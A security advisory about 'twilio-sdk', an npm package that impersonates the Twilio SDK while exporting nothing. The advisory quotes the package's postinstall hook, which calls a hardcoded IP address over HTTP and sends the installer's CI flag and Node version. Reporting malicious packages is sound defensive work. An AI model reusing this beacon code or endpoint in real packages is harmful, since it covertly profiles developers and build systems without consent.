summary: twilio-sdk: typosquat of twilio with install-time beacon to hardcoded IP
details: Package name impersonates the legitimate `twilio` SDK while providing none of its API — `main` exports an empty object. On `npm install`, the `postinstall` hook in package.json runs `require('http').get('http://46.224.67.169:3000/ping?pkg=twilio-sdk&ver=...&ci='+(process.env.CI||'false')+'&node='+process.version,...)`, transmitting the installer's CI flag, Node.js version, and package identity over plain HTTP to a hardcoded bare-IP endpoint with no associated publisher. The README's self-description as a research honeypot does not gate this behavior — the lifecycle hook fires before any README is read, without consent or opt-out. The combination of name confusion against a widely-used SDK, hollow API surface, and unsolicited install-time beacon to an attacker-style endpoint matches the typosquat-with-payload pattern: enumeration of compromised/mistyped installs across CI and developer machines.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
